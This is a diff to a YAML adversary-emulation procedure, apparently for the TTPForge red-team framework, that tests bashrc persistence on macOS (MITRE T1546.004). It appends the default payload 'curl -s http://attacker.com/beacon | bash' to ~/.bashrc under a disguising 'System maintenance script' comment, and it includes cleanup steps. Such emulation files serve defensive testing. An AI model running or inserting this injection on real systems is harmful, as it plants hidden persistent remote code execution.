@@ -1,53 +1,50 @@
+---
 api_version: 2.0
-uuid: 12345678-6666-6666-6666-666666666666
+uuid: ee5e86f8-722e-4cb5-9677-2c23358e9f22
 name: Modify ~/.bashrc
-description: Modifies bash shell initialization file to execute malicious code on shell startup
-mitre_attack_id: T1156
-mitre_attack_technique: .bashrc
-mitre_attack_tactic: Persistence
-platforms:
-  - darwin
+authors:
+- TTPForge
+description: |
+  Modifies bash shell initialization file to execute malicious code on shell startup
+mitre:
+  tactics:
+  - TA0003 Persistence
+  techniques:
+  - T1546 Event Triggered Execution
+  subtechniques:
+  - 'T1546.004 Event Triggered Execution: Unix Shell Configuration Modification'
 requirements:
   platforms:
-    - os: darwin
+  - os: darwin
 args:
-  bashrc_path:
-    description: Path to bash configuration file
-    type: string
-    default: ~/.bashrc
-  backup_path:
-    description: Path to backup the original bashrc
-    type: string
-    default: ~/.bashrc.bak
-  payload_command:
-    description: Command to inject into bashrc
-    type: string
-    default: "curl -s http://attacker.com/beacon | bash"
+- name: bashrc_path
+  description: Path to bash configuration file
+  type: string
+  default: ~/.bashrc
+- name: backup_path
+  description: Path to backup the original bashrc
+  type: string
+  default: ~/.bashrc.bak
+- name: payload_command
+  description: Command to inject into bashrc
+  type: string
+  default: curl -s http://attacker.com/beacon | bash
 steps:
-  - name: backup_original_bashrc
-    type: shell_command
-    command: "cp {{ bashrc_path }} {{ backup_path }} 2>/dev/null || true"
-  
-  - name: inject_into_bashrc
-    type: shell_command
-    command: |
-      echo "" >> {{ bashrc_path }}
-      echo "# System maintenance script" >> {{ bashrc_path }}
-      echo "{{ payload_command }} &" >> {{ bashrc_path }}
-
-checks:
-  - type: file_exists
-    path: "{{ bashrc_path }}"
-  - type: file_contains
-    path: "{{ bashrc_path }}"
-    value: "{{ payload_command }}"
-
-cleanup:
-  - type: shell_command
-    command: |
-      if [ -f "{{ backup_path }}" ]; then
-        cp {{ backup_path }} {{ bashrc_path }}
-        rm {{ backup_path }}
+- name: backup_original_bashrc
+  inline: cp {{ .Args.bashrc_path }} {{ .Args.backup_path }} 2>/dev/null || true
+- name: inject_into_bashrc
+  inline: |
+    echo "" >> {{ .Args.bashrc_path }}
+    echo "# System maintenance script" >> {{ .Args.bashrc_path }}
+    echo "{{ .Args.payload_command }} &" >> {{ .Args.bashrc_path }}
+  cleanup:
+    inline: |
+      if [ -f "{{ .Args.backup_path }}" ]; then
+        cp {{ .Args.backup_path }} {{ .Args.bashrc_path }}
+        rm {{ .Args.backup_path }}
       else
-        sed -i '' '/# System maintenance script/,+1d' {{ bashrc_path }}
+        sed -i '' '/# System maintenance script/,+1d' {{ .Args.bashrc_path }}
       fi
+tests:
+- name: dry_run_test
+  dry_run: true
